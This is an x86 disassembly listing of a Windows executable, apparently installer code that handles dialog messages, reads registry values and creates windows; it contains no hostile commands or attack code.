  40567f:	ff 4d 08             	decl   0x8(%ebp)
  405682:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405685:	50                   	push   %eax
  405686:	ff 75 08             	push   0x8(%ebp)
  405689:	57                   	push   %edi
  40568a:	ff 75 fc             	push   -0x4(%ebp)
  40568d:	ff 15 78 92 40 00    	call   *0x409278
  405693:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405696:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  40569a:	75 e3                	jne    0x40567f
  40569c:	53                   	push   %ebx
  40569d:	ff 15 f4 91 40 00    	call   *0x4091f4
  4056a3:	ff 15 f8 91 40 00    	call   *0x4091f8
  4056a9:	8d 04 36             	lea    (%esi,%esi,1),%eax
  4056ac:	50                   	push   %eax
  4056ad:	6a 42                	push   $0x42
  4056af:	ff 15 2c 91 40 00    	call   *0x40912c
  4056b5:	50                   	push   %eax
  4056b6:	89 45 08             	mov    %eax,0x8(%ebp)
  4056b9:	ff 15 a8 90 40 00    	call   *0x4090a8
  4056bf:	8b f0                	mov    %eax,%esi
  4056c1:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4056c4:	50                   	push   %eax
  4056c5:	53                   	push   %ebx
  4056c6:	57                   	push   %edi
  4056c7:	ff 75 fc             	push   -0x4(%ebp)
  4056ca:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  4056cd:	ff 15 78 92 40 00    	call   *0x409278
  4056d3:	8d 34 46             	lea    (%esi,%eax,2),%esi
  4056d6:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  4056db:	46                   	inc    %esi
  4056dc:	46                   	inc    %esi
  4056dd:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  4056e2:	46                   	inc    %esi
  4056e3:	46                   	inc    %esi
  4056e4:	43                   	inc    %ebx
  4056e5:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  4056e8:	7c d7                	jl     0x4056c1
  4056ea:	ff 75 08             	push   0x8(%ebp)
  4056ed:	ff 15 ac 90 40 00    	call   *0x4090ac
  4056f3:	ff 75 08             	push   0x8(%ebp)
  4056f6:	6a 0d                	push   $0xd
  4056f8:	ff 15 fc 91 40 00    	call   *0x4091fc
  4056fe:	ff 15 00 92 40 00    	call   *0x409200
  405704:	e9 15 fe ff ff       	jmp    0x40551e
  405709:	83 ec 10             	sub    $0x10,%esp
  40570c:	53                   	push   %ebx
  40570d:	55                   	push   %ebp
  40570e:	56                   	push   %esi
  40570f:	8b 74 24 24          	mov    0x24(%esp),%esi
  405713:	b9 10 01 00 00       	mov    $0x110,%ecx
  405718:	3b f1                	cmp    %ecx,%esi
  40571a:	57                   	push   %edi
  40571b:	0f 84 61 01 00 00    	je     0x405882
  405721:	81 fe 08 04 00 00    	cmp    $0x408,%esi
  405727:	0f 84 55 01 00 00    	je     0x405882
  40572d:	8b 7c 24 24          	mov    0x24(%esp),%edi
  405731:	33 ed                	xor    %ebp,%ebp
  405733:	83 fe 47             	cmp    $0x47,%esi
  405736:	75 13                	jne    0x40574b
  405738:	6a 13                	push   $0x13
  40573a:	55                   	push   %ebp
  40573b:	55                   	push   %ebp
  40573c:	55                   	push   %ebp
  40573d:	55                   	push   %ebp
  40573e:	57                   	push   %edi
  40573f:	ff 35 f8 21 42 00    	push   0x4221f8
  405745:	ff 15 c8 91 40 00    	call   *0x4091c8
  40574b:	83 fe 05             	cmp    $0x5,%esi
  40574e:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  405752:	75 42                	jne    0x405796
  405754:	8b c3                	mov    %ebx,%eax
  405756:	48                   	dec    %eax
  405757:	f7 d8                	neg    %eax
  405759:	1b c0                	sbb    %eax,%eax
  40575b:	83 e0 05             	and    $0x5,%eax
  40575e:	50                   	push   %eax
  40575f:	ff 35 f8 21 42 00    	push   0x4221f8
  405765:	ff 15 48 92 40 00    	call   *0x409248
  40576b:	83 fb 02             	cmp    $0x2,%ebx
  40576e:	0f 85 fb 00 00 00    	jne    0x40586f
  405774:	6a f0                	push   $0xfffffff0
  405776:	57                   	push   %edi
  405777:	ff 15 20 92 40 00    	call   *0x409220
  40577d:	25 00 00 01 21       	and    $0x21010000,%eax
  405782:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  405787:	0f 85 e2 00 00 00    	jne    0x40586f
  40578d:	6a 04                	push   $0x4
  40578f:	57                   	push   %edi
  405790:	ff 15 48 92 40 00    	call   *0x409248
  405796:	81 fe 0d 04 00 00    	cmp    $0x40d,%esi
  40579c:	75 17                	jne    0x4057b5
  40579e:	ff 35 48 95 42 00    	push   0x429548
  4057a4:	ff 15 30 92 40 00    	call   *0x409230
  4057aa:	89 1d 48 95 42 00    	mov    %ebx,0x429548
  4057b0:	e9 fe 03 00 00       	jmp    0x405bb3
  4057b5:	83 fe 11             	cmp    $0x11,%esi
  4057b8:	75 11                	jne    0x4057cb
  4057ba:	55                   	push   %ebp
  4057bb:	55                   	push   %ebp
  4057bc:	57                   	push   %edi
  4057bd:	ff 15 60 92 40 00    	call   *0x409260
  4057c3:	33 c0                	xor    %eax,%eax
  4057c5:	40                   	inc    %eax
  4057c6:	e9 0d 04 00 00       	jmp    0x405bd8
  4057cb:	81 fe 11 01 00 00    	cmp    $0x111,%esi
  4057d1:	0f 85 98 00 00 00    	jne    0x40586f
  4057d7:	0f b7 f3             	movzwl %bx,%esi
  4057da:	56                   	push   %esi
  4057db:	57                   	push   %edi
  4057dc:	ff 15 5c 92 40 00    	call   *0x40925c
  4057e2:	8b f8                	mov    %eax,%edi
  4057e4:	3b fd                	cmp    %ebp,%edi
  4057e6:	74 1d                	je     0x405805
  4057e8:	55                   	push   %ebp
  4057e9:	55                   	push   %ebp
  4057ea:	68 f3 00 00 00       	push   $0xf3
  4057ef:	57                   	push   %edi
  4057f0:	ff 15 78 92 40 00    	call   *0x409278
  4057f6:	57                   	push   %edi
  4057f7:	ff 15 cc 91 40 00    	call   *0x4091cc
  4057fd:	85 c0                	test   %eax,%eax
  4057ff:	0f 84 d1 03 00 00    	je     0x405bd6
  405805:	83 fe 01             	cmp    $0x1,%esi
  405808:	75 03                	jne    0x40580d
  40580a:	56                   	push   %esi
  40580b:	eb 2e                	jmp    0x40583b
  40580d:	83 fe 03             	cmp    $0x3,%esi
  405810:	75 0c                	jne    0x40581e
  405812:	39 2d 18 b0 40 00    	cmp    %ebp,0x40b018
  405818:	7e 3f                	jle    0x405859
  40581a:	6a ff                	push   $0xffffffff
  40581c:	eb 1d                	jmp    0x40583b
  40581e:	6a 02                	push   $0x2
  405820:	5f                   	pop    %edi
  405821:	3b f7                	cmp    %edi,%esi
  405823:	75 34                	jne    0x405859
  405825:	39 2d 4c a6 42 00    	cmp    %ebp,0x42a64c
  40582b:	74 15                	je     0x405842
  40582d:	57                   	push   %edi
  40582e:	e8 de bb ff ff       	call   0x401411
  405833:	89 3d 08 5a 42 00    	mov    %edi,0x425a08
  405839:	6a 78                	push   $0x78
  40583b:	e8 0e e8 ff ff       	call   0x40404e
  405840:	eb 2d                	jmp    0x40586f
  405842:	6a 03                	push   $0x3
  405844:	e8 c8 bb ff ff       	call   0x401411
  405849:	85 c0                	test   %eax,%eax
  40584b:	75 22                	jne    0x40586f
  40584d:	c7 05 08 5a 42 00 01 	movl   $0x1,0x425a08
  405854:	00 00 00 
  405857:	eb e0                	jmp    0x405839
  405859:	ff 74 24 30          	push   0x30(%esp)
  40585d:	53                   	push   %ebx
  40585e:	68 11 01 00 00       	push   $0x111
  405863:	ff 35 48 95 42 00    	push   0x429548
  405869:	ff 15 78 92 40 00    	call   *0x409278
  40586f:	ff 74 24 30          	push   0x30(%esp)
  405873:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405877:	53                   	push   %ebx
  405878:	e8 83 e8 ff ff       	call   0x404100
  40587d:	e9 56 03 00 00       	jmp    0x405bd8
  405882:	3b f1                	cmp    %ecx,%esi
  405884:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405888:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40588c:	a3 e0 19 42 00       	mov    %eax,0x4219e0
  405891:	75 4d                	jne    0x4058e0
  405893:	8b 35 5c 92 40 00    	mov    0x40925c,%esi
  405899:	6a 01                	push   $0x1
  40589b:	57                   	push   %edi
  40589c:	89 3d 84 a5 42 00    	mov    %edi,0x42a584
  4058a2:	ff d6                	call   *%esi
  4058a4:	6a 02                	push   $0x2
  4058a6:	57                   	push   %edi
  4058a7:	a3 00 5a 42 00       	mov    %eax,0x425a00
  4058ac:	ff d6                	call   *%esi
  4058ae:	6a ff                	push   $0xffffffff
  4058b0:	6a 1c                	push   $0x1c
  4058b2:	57                   	push   %edi
  4058b3:	a3 ec 19 42 00       	mov    %eax,0x4219ec
  4058b8:	e8 b8 e7 ff ff       	call   0x404075
  4058bd:	ff 35 50 95 42 00    	push   0x429550
  4058c3:	6a f2                	push   $0xfffffff2
  4058c5:	57                   	push   %edi
  4058c6:	ff 15 d0 91 40 00    	call   *0x4091d0
  4058cc:	6a 04                	push   $0x4
  4058ce:	e8 3e bb ff ff       	call   0x401411
  4058d3:	a3 54 95 42 00       	mov    %eax,0x429554
  4058d8:	33 c0                	xor    %eax,%eax
  4058da:	40                   	inc    %eax
  4058db:	a3 e0 19 42 00       	mov    %eax,0x4219e0
  4058e0:	8b 0d 18 b0 40 00    	mov    0x40b018,%ecx
  4058e6:	8b f1                	mov    %ecx,%esi
  4058e8:	c1 e6 06             	shl    $0x6,%esi
  4058eb:	03 35 a0 a5 42 00    	add    0x42a5a0,%esi
  4058f1:	33 ed                	xor    %ebp,%ebp
  4058f3:	3b cd                	cmp    %ebp,%ecx
  4058f5:	7c 3e                	jl     0x405935
  4058f7:	83 f8 01             	cmp    $0x1,%eax
  4058fa:	75 31                	jne    0x40592d
  4058fc:	55                   	push   %ebp
  4058fd:	ff 76 10             	push   0x10(%esi)
  405900:	e8 8a ba ff ff       	call   0x40138f
  405905:	85 c0                	test   %eax,%eax
  405907:	74 24                	je     0x40592d
  405909:	6a 01                	push   $0x1
  40590b:	55                   	push   %ebp
  40590c:	68 0f 04 00 00       	push   $0x40f
  405911:	ff 35 48 95 42 00    	push   0x429548
  405917:	ff 15 78 92 40 00    	call   *0x409278
  40591d:	33 c0                	xor    %eax,%eax
  40591f:	39 2d 54 95 42 00    	cmp    %ebp,0x429554
  405925:	0f 94 c0             	sete   %al
  405928:	e9 ab 02 00 00       	jmp    0x405bd8
  40592d:	39 2e                	cmp    %ebp,(%esi)
  40592f:	0f 84 a1 02 00 00    	je     0x405bd6
  405935:	68 0b 04 00 00       	push   $0x40b
  40593a:	e8 a6 e7 ff ff       	call   0x4040e5
  40593f:	a1 e0 19 42 00       	mov    0x4219e0,%eax
  405944:	01 05 18 b0 40 00    	add    %eax,0x40b018
  40594a:	c1 e0 06             	shl    $0x6,%eax
  40594d:	03 f0                	add    %eax,%esi
  40594f:	a1 18 b0 40 00       	mov    0x40b018,%eax
  405954:	3b 05 a4 a5 42 00    	cmp    0x42a5a4,%eax
  40595a:	75 07                	jne    0x405963
  40595c:	6a 01                	push   $0x1
  40595e:	e8 ae ba ff ff       	call   0x401411
  405963:	39 2d 54 95 42 00    	cmp    %ebp,0x429554
  405969:	0f 85 25 02 00 00    	jne    0x405b94
  40596f:	a1 a4 a5 42 00       	mov    0x42a5a4,%eax
  405974:	39 05 18 b0 40 00    	cmp    %eax,0x40b018
  40597a:	0f 83 14 02 00 00    	jae    0x405b94
  405980:	ff 76 24             	push   0x24(%esi)
  405983:	8b 5e 14             	mov    0x14(%esi),%ebx
  405986:	68 00 a0 43 00       	push   $0x43a000
  40598b:	e8 51 0f 00 00       	call   0x4068e1
  405990:	ff 76 20             	push   0x20(%esi)
  405993:	68 19 fc ff ff       	push   $0xfffffc19
  405998:	57                   	push   %edi
  405999:	e8 d7 e6 ff ff       	call   0x404075
  40599e:	ff 76 1c             	push   0x1c(%esi)
  4059a1:	68 1b fc ff ff       	push   $0xfffffc1b
  4059a6:	57                   	push   %edi
  4059a7:	e8 c9 e6 ff ff       	call   0x404075
  4059ac:	ff 76 28             	push   0x28(%esi)
  4059af:	68 1a fc ff ff       	push   $0xfffffc1a
  4059b4:	57                   	push   %edi
  4059b5:	e8 bb e6 ff ff       	call   0x404075
  4059ba:	6a 03                	push   $0x3
  4059bc:	57                   	push   %edi
  4059bd:	ff 15 5c 92 40 00    	call   *0x40925c
  4059c3:	39 2d 4c a6 42 00    	cmp    %ebp,0x42a64c
  4059c9:	89 44 24 30          	mov    %eax,0x30(%esp)
  4059cd:	74 09                	je     0x4059d8
  4059cf:	81 e3 fd fe ff ff    	and    $0xfffffefd,%ebx
  4059d5:	83 cb 04             	or     $0x4,%ebx
  4059d8:	8b cb                	mov    %ebx,%ecx
  4059da:	83 e1 08             	and    $0x8,%ecx
  4059dd:	51                   	push   %ecx
  4059de:	50                   	push   %eax
  4059df:	ff 15 48 92 40 00    	call   *0x409248
  4059e5:	8b c3                	mov    %ebx,%eax
  4059e7:	25 00 01 00 00       	and    $0x100,%eax
  4059ec:	50                   	push   %eax
  4059ed:	ff 74 24 34          	push   0x34(%esp)
  4059f1:	ff 15 70 92 40 00    	call   *0x409270
  4059f7:	8b c3                	mov    %ebx,%eax
  4059f9:	83 e0 02             	and    $0x2,%eax
  4059fc:	50                   	push   %eax
  4059fd:	e8 b9 e6 ff ff       	call   0x4040bb
  405a02:	83 e3 04             	and    $0x4,%ebx
  405a05:	53                   	push   %ebx
  405a06:	ff 35 ec 19 42 00    	push   0x4219ec
  405a0c:	ff 15 70 92 40 00    	call   *0x409270
  405a12:	3b dd                	cmp    %ebp,%ebx
  405a14:	74 03                	je     0x405a19
  405a16:	55                   	push   %ebp
  405a17:	eb 02                	jmp    0x405a1b
  405a19:	6a 01                	push   $0x1
  405a1b:	68 60 f0 00 00       	push   $0xf060
  405a20:	55                   	push   %ebp
  405a21:	57                   	push   %edi
  405a22:	ff 15 d4 91 40 00    	call   *0x4091d4
  405a28:	50                   	push   %eax
  405a29:	ff 15 d8 91 40 00    	call   *0x4091d8
  405a2f:	8b 1d 78 92 40 00    	mov    0x409278,%ebx
  405a35:	6a 01                	push   $0x1
  405a37:	55                   	push   %ebp
  405a38:	68 f4 00 00 00       	push   $0xf4
  405a3d:	ff 74 24 3c          	push   0x3c(%esp)
  405a41:	ff d3                	call   *%ebx
  405a43:	39 2d 4c a6 42 00    	cmp    %ebp,0x42a64c
  405a49:	74 13                	je     0x405a5e
  405a4b:	55                   	push   %ebp
  405a4c:	6a 02                	push   $0x2
  405a4e:	68 01 04 00 00       	push   $0x401
  405a53:	57                   	push   %edi
  405a54:	ff d3                	call   *%ebx
  405a56:	ff 35 ec 19 42 00    	push   0x4219ec
  405a5c:	eb 06                	jmp    0x405a64
  405a5e:	ff 35 00 5a 42 00    	push   0x425a00
  405a64:	e8 65 e6 ff ff       	call   0x4040ce
  405a69:	e8 5e e7 ff ff       	call   0x4041cc
  405a6e:	50                   	push   %eax
  405a6f:	bb 00 3a 42 00       	mov    $0x423a00,%ebx
  405a74:	53                   	push   %ebx
  405a75:	e8 4d 0a 00 00       	call   0x4064c7
  405a7a:	ff 76 18             	push   0x18(%esi)
  405a7d:	53                   	push   %ebx
  405a7e:	e8 5a 0a 00 00       	call   0x4064dd
  405a83:	8d 04 45 00 3a 42 00 	lea    0x423a00(,%eax,2),%eax
  405a8a:	50                   	push   %eax
  405a8b:	e8 51 0e 00 00       	call   0x4068e1
  405a90:	53                   	push   %ebx
  405a91:	57                   	push   %edi
  405a92:	ff 15 3c 92 40 00    	call   *0x40923c
  405a98:	55                   	push   %ebp
  405a99:	ff 76 08             	push   0x8(%esi)
  405a9c:	e8 ee b8 ff ff       	call   0x40138f
  405aa1:	85 c0                	test   %eax,%eax
  405aa3:	0f 85 96 fe ff ff    	jne    0x40593f
  405aa9:	39 2e                	cmp    %ebp,(%esi)
  405aab:	0f 84 8e fe ff ff    	je     0x40593f
  405ab1:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  405ab5:	75 1d                	jne    0x405ad4
  405ab7:	39 2d 4c a6 42 00    	cmp    %ebp,0x42a64c
  405abd:	0f 85 13 01 00 00    	jne    0x405bd6
  405ac3:	39 2d 40 a6 42 00    	cmp    %ebp,0x42a640
  405ac9:	0f 85 70 fe ff ff    	jne    0x40593f
  405acf:	e9 02 01 00 00       	jmp    0x405bd6
  405ad4:	ff 35 48 95 42 00    	push   0x429548
  405ada:	ff 15 30 92 40 00    	call   *0x409230
  405ae0:	39 2e                	cmp    %ebp,(%esi)
  405ae2:	89 35 04 5a 42 00    	mov    %esi,0x425a04
  405ae8:	0f 8e c5 00 00 00    	jle    0x405bb3
  405aee:	8b 46 04             	mov    0x4(%esi),%eax
  405af1:	56                   	push   %esi
  405af2:	ff 34 85 1c b0 40 00 	push   0x40b01c(,%eax,4)
  405af9:	66 8b 06             	mov    (%esi),%ax
  405afc:	66 03 05 5c 95 42 00 	add    0x42955c,%ax
  405b03:	57                   	push   %edi
  405b04:	0f b7 c0             	movzwl %ax,%eax
  405b07:	50                   	push   %eax
  405b08:	ff 35 88 a5 42 00    	push   0x42a588
  405b0e:	ff 15 34 92 40 00    	call   *0x409234
  405b14:	3b c5                	cmp    %ebp,%eax
  405b16:	a3 48 95 42 00       	mov    %eax,0x429548
  405b1b:	0f 84 92 00 00 00    	je     0x405bb3
  405b21:	ff 76 2c             	push   0x2c(%esi)
  405b24:	6a 06                	push   $0x6
  405b26:	50                   	push   %eax
  405b27:	e8 49 e5 ff ff       	call   0x404075
  405b2c:	8d 44 24 10          	lea    0x10(%esp),%eax
  405b30:	50                   	push   %eax
  405b31:	68 fa 03 00 00       	push   $0x3fa
  405b36:	57                   	push   %edi
  405b37:	ff 15 5c 92 40 00    	call   *0x40925c
  405b3d:	50                   	push   %eax
  405b3e:	ff 15 ec 91 40 00    	call   *0x4091ec
  405b44:	8d 44 24 10          	lea    0x10(%esp),%eax
  405b48:	50                   	push   %eax
  405b49:	57                   	push   %edi
  405b4a:	ff 15 10 92 40 00    	call   *0x409210
  405b50:	6a 15                	push   $0x15
  405b52:	55                   	push   %ebp
  405b53:	55                   	push   %ebp
  405b54:	ff 74 24 20          	push   0x20(%esp)
  405b58:	ff 74 24 20          	push   0x20(%esp)
  405b5c:	55                   	push   %ebp
  405b5d:	ff 35 48 95 42 00    	push   0x429548
  405b63:	ff 15 c8 91 40 00    	call   *0x4091c8
  405b69:	55                   	push   %ebp
  405b6a:	ff 76 0c             	push   0xc(%esi)
  405b6d:	e8 1d b8 ff ff       	call   0x40138f
  405b72:	39 2d 54 95 42 00    	cmp    %ebp,0x429554
  405b78:	75 5c                	jne    0x405bd6
  405b7a:	6a 08                	push   $0x8
  405b7c:	ff 35 48 95 42 00    	push   0x429548
  405b82:	ff 15 48 92 40 00    	call   *0x409248
  405b88:	68 05 04 00 00       	push   $0x405
  405b8d:	e8 53 e5 ff ff       	call   0x4040e5
  405b92:	eb 1f                	jmp    0x405bb3
  405b94:	ff 35 48 95 42 00    	push   0x429548
  405b9a:	ff 15 30 92 40 00    	call   *0x409230
  405ba0:	ff 35 08 5a 42 00    	push   0x425a08
  405ba6:	89 2d 84 a5 42 00    	mov    %ebp,0x42a584
  405bac:	57                   	push   %edi
  405bad:	ff 15 dc 91 40 00    	call   *0x4091dc
  405bb3:	39 2d 10 5a 42 00    	cmp    %ebp,0x425a10
  405bb9:	75 1b                	jne    0x405bd6
  405bbb:	39 2d 48 95 42 00    	cmp    %ebp,0x429548
  405bc1:	74 13                	je     0x405bd6
  405bc3:	6a 0a                	push   $0xa
  405bc5:	57                   	push   %edi
  405bc6:	ff 15 48 92 40 00    	call   *0x409248
  405bcc:	c7 05 10 5a 42 00 01 	movl   $0x1,0x425a10
  405bd3:	00 00 00 
  405bd6:	33 c0                	xor    %eax,%eax
  405bd8:	5f                   	pop    %edi
  405bd9:	5e                   	pop    %esi
  405bda:	5d                   	pop    %ebp
  405bdb:	5b                   	pop    %ebx
  405bdc:	83 c4 10             	add    $0x10,%esp
  405bdf:	c2 10 00             	ret    $0x10
  405be2:	83 ec 10             	sub    $0x10,%esp
  405be5:	53                   	push   %ebx
  405be6:	55                   	push   %ebp
  405be7:	56                   	push   %esi
  405be8:	8b 35 8c a5 42 00    	mov    0x42a58c,%esi
  405bee:	57                   	push   %edi
  405bef:	6a 02                	push   $0x2
  405bf1:	e8 54 0a 00 00       	call   0x40664a
  405bf6:	33 ff                	xor    %edi,%edi
  405bf8:	3b c7                	cmp    %edi,%eax
  405bfa:	74 12                	je     0x405c0e
  405bfc:	ff d0                	call   *%eax
  405bfe:	0f b7 c0             	movzwl %ax,%eax
  405c01:	50                   	push   %eax
  405c02:	68 00 70 43 00       	push   $0x437000
  405c07:	e8 02 08 00 00       	call   0x40640e
  405c0c:	eb 5a                	jmp    0x405c68
  405c0e:	57                   	push   %edi
  405c0f:	bb 00 3a 42 00       	mov    $0x423a00,%ebx
  405c14:	53                   	push   %ebx
  405c15:	57                   	push   %edi
  405c16:	68 28 97 40 00       	push   $0x409728
  405c1b:	68 01 00 00 80       	push   $0x80000001
  405c20:	66 c7 05 00 70 43 00 	movw   $0x30,0x437000
  405c27:	30 00 
  405c29:	66 c7 05 02 70 43 00 	movw   $0x78,0x437002
  405c30:	78 00 
  405c32:	66 89 3d 04 70 43 00 	mov    %di,0x437004
  405c39:	e8 57 07 00 00       	call   0x406395
  405c3e:	66 39 3d 00 3a 42 00 	cmp    %di,0x423a00
  405c45:	75 16                	jne    0x405c5d
  405c47:	57                   	push   %edi
  405c48:	53                   	push   %ebx
  405c49:	68 64 97 40 00       	push   $0x409764
  405c4e:	68 d8 96 40 00       	push   $0x4096d8
  405c53:	68 03 00 00 80       	push   $0x80000003
  405c58:	e8 38 07 00 00       	call   0x406395
  405c5d:	53                   	push   %ebx
  405c5e:	68 00 70 43 00       	push   $0x437000
  405c63:	e8 7b 08 00 00       	call   0x4064e3
  405c68:	e8 7e e5 ff ff       	call   0x4041eb
  405c6d:	a1 f0 a5 42 00       	mov    0x42a5f0,%eax
  405c72:	83 e0 20             	and    $0x20,%eax
  405c75:	bd 00 58 43 00       	mov    $0x435800,%ebp
  405c7a:	55                   	push   %ebp
  405c7b:	a3 40 a6 42 00       	mov    %eax,0x42a640
  405c80:	c7 05 5c a6 42 00 00 	movl   $0x10000,0x42a65c
  405c87:	00 01 00 
  405c8a:	e8 ca 0b 00 00       	call   0x406859
  405c8f:	85 c0                	test   %eax,%eax
  405c91:	0f 85 8c 00 00 00    	jne    0x405d23
  405c97:	8b 4e 48             	mov    0x48(%esi),%ecx
  405c9a:	3b cf                	cmp    %edi,%ecx
  405c9c:	0f 84 81 00 00 00    	je     0x405d23
  405ca2:	a1 b8 a5 42 00       	mov    0x42a5b8,%eax
  405ca7:	8b 56 4c             	mov    0x4c(%esi),%edx
  405caa:	57                   	push   %edi
  405cab:	bb 20 85 42 00       	mov    $0x428520,%ebx
  405cb0:	53                   	push   %ebx
  405cb1:	8d 14 50             	lea    (%eax,%edx,2),%edx
  405cb4:	52                   	push   %edx
  405cb5:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  405cb8:	50                   	push   %eax
  405cb9:	ff 76 44             	push   0x44(%esi)
  405cbc:	e8 d4 06 00 00       	call   0x406395
  405cc1:	66 a1 20 85 42 00    	mov    0x428520,%ax
  405cc7:	66 3b c7             	cmp    %di,%ax
  405cca:	74 57                	je     0x405d23
  405ccc:	66 3d 22 00          	cmp    $0x22,%ax
  405cd0:	75 10                	jne    0x405ce2
  405cd2:	6a 22                	push   $0x22
  405cd4:	bb 22 85 42 00       	mov    $0x428522,%ebx
  405cd9:	53                   	push   %ebx
  405cda:	e8 31 03 00 00       	call   0x406010
  405cdf:	66 89 38             	mov    %di,(%eax)
  405ce2:	53                   	push   %ebx
  405ce3:	e8 f5 07 00 00       	call   0x4064dd
  405ce8:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  405cec:	3b c3                	cmp    %ebx,%eax
  405cee:	76 26                	jbe    0x405d16
  405cf0:	68 cc 96 40 00       	push   $0x4096cc
  405cf5:	50                   	push   %eax
  405cf6:	ff 15 20 91 40 00    	call   *0x409120
  405cfc:	85 c0                	test   %eax,%eax
  405cfe:	75 16                	jne    0x405d16
  405d00:	53                   	push   %ebx
  405d01:	ff 15 fc 90 40 00    	call   *0x4090fc
  405d07:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d0a:	74 04                	je     0x405d10
  405d0c:	a8 10                	test   $0x10,%al
  405d0e:	75 06                	jne    0x405d16
  405d10:	53                   	push   %ebx
  405d11:	e8 d1 0a 00 00       	call   0x4067e7
  405d16:	53                   	push   %ebx
  405d17:	e8 9c 0a 00 00       	call   0x4067b8
  405d1c:	50                   	push   %eax
  405d1d:	55                   	push   %ebp
  405d1e:	e8 a4 07 00 00       	call   0x4064c7
  405d23:	55                   	push   %ebp
  405d24:	e8 30 0b 00 00       	call   0x406859
  405d29:	85 c0                	test   %eax,%eax
  405d2b:	75 0c                	jne    0x405d39
  405d2d:	ff b6 18 01 00 00    	push   0x118(%esi)
  405d33:	55                   	push   %ebp
  405d34:	e8 a8 0b 00 00       	call   0x4068e1
  405d39:	68 40 80 00 00       	push   $0x8040
  405d3e:	57                   	push   %edi
  405d3f:	57                   	push   %edi
  405d40:	6a 01                	push   $0x1
  405d42:	6a 67                	push   $0x67
  405d44:	ff 35 88 a5 42 00    	push   0x42a588
  405d4a:	ff 15 64 92 40 00    	call   *0x409264
  405d50:	a3 50 95 42 00       	mov    %eax,0x429550
  405d55:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  405d59:	bb 20 95 42 00       	mov    $0x429520,%ebx
  405d5e:	74 7f                	je     0x405ddf
  405d60:	8b 0d 88 a5 42 00    	mov    0x42a588,%ecx
  405d66:	be c4 96 40 00       	mov    $0x4096c4,%esi
  405d6b:	53                   	push   %ebx
  405d6c:	c7 05 24 95 42 00 00 	movl   $0x401000,0x429524
  405d73:	10 40 00 
  405d76:	89 0d 30 95 42 00    	mov    %ecx,0x429530
  405d7c:	a3 34 95 42 00       	mov    %eax,0x429534
  405d81:	89 35 44 95 42 00    	mov    %esi,0x429544
  405d87:	ff 15 b4 91 40 00    	call   *0x4091b4
  405d8d:	66 85 c0             	test   %ax,%ax
  405d90:	0f 84 18 01 00 00    	je     0x405eae
  405d96:	57                   	push   %edi
  405d97:	8d 44 24 14          	lea    0x14(%esp),%eax
  405d9b:	50                   	push   %eax
  405d9c:	57                   	push   %edi
  405d9d:	6a 30                	push   $0x30
  405d9f:	ff 15 b8 91 40 00    	call   *0x4091b8
  405da5:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405da9:	2b 44 24 14          	sub    0x14(%esp),%eax
  405dad:	57                   	push   %edi
  405dae:	ff 35 88 a5 42 00    	push   0x42a588
  405db4:	57                   	push   %edi
  405db5:	57                   	push   %edi
  405db6:	50                   	push   %eax
  405db7:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  405dbb:	2b 44 24 24          	sub    0x24(%esp),%eax
  405dbf:	50                   	push   %eax
  405dc0:	ff 74 24 2c          	push   0x2c(%esp)
  405dc4:	ff 74 24 2c          	push   0x2c(%esp)
  405dc8:	68 00 00 00 80       	push   $0x80000000
  405dcd:	57                   	push   %edi
  405dce:	56                   	push   %esi
  405dcf:	68 80 00 00 00       	push   $0x80
  405dd4:	ff 15 bc 91 40 00    	call   *0x4091bc
  405dda:	a3 f8 21 42 00       	mov    %eax,0x4221f8
  405ddf:	57                   	push   %edi
  405de0:	e8 2c b6 ff ff       	call   0x401411
  405de5:	85 c0                	test   %eax,%eax
  405de7:	74 08                	je     0x405df1
  405de9:	6a 02                	push   $0x2
  405deb:	58                   	pop    %eax
  405dec:	e9 bf 00 00 00       	jmp    0x405eb0
  405df1:	e8 f5 e3 ff ff       	call   0x4041eb
  405df6:	39 3d 60 a6 42 00    	cmp    %edi,0x42a660
  405dfc:	0f 85 83 00 00 00    	jne    0x405e85
  405e02:	6a 05                	push   $0x5
  405e04:	ff 35 f8 21 42 00    	push   0x4221f8
  405e0a:	ff 15 48 92 40 00    	call   *0x409248
  405e10:	68 b8 96 40 00       	push   $0x4096b8
  405e15:	e8 c0 07 00 00       	call   0x4065da
  405e1a:	85 c0                	test   %eax,%eax
  405e1c:	75 0a                	jne    0x405e28
  405e1e:	68 ac 96 40 00       	push   $0x4096ac
  405e23:	e8 b2 07 00 00       	call   0x4065da
  405e28:	8b 35 c0 91 40 00    	mov    0x4091c0,%esi
  405e2e:	53                   	push   %ebx
  405e2f:	bd 94 96 40 00       	mov    $0x409694,%ebp
  405e34:	55                   	push   %ebp
  405e35:	57                   	push   %edi
  405e36:	ff d6                	call   *%esi
  405e38:	85 c0                	test   %eax,%eax
  405e3a:	75 16                	jne    0x405e52
  405e3c:	53                   	push   %ebx
  405e3d:	68 80 96 40 00       	push   $0x409680
  405e42:	57                   	push   %edi
  405e43:	ff d6                	call   *%esi
  405e45:	53                   	push   %ebx
  405e46:	89 2d 44 95 42 00    	mov    %ebp,0x429544
  405e4c:	ff 15 b4 91 40 00    	call   *0x4091b4
  405e52:	a1 5c 95 42 00       	mov    0x42955c,%eax
  405e57:	57                   	push   %edi
  405e58:	68 09 57 40 00       	push   $0x405709
  405e5d:	83 c0 69             	add    $0x69,%eax
  405e60:	0f b7 c0             	movzwl %ax,%eax
  405e63:	57                   	push   %edi
  405e64:	50                   	push   %eax
  405e65:	ff 35 88 a5 42 00    	push   0x42a588
  405e6b:	ff 15 c4 91 40 00    	call   *0x4091c4
  405e71:	6a 05                	push   $0x5
  405e73:	8b f0                	mov    %eax,%esi
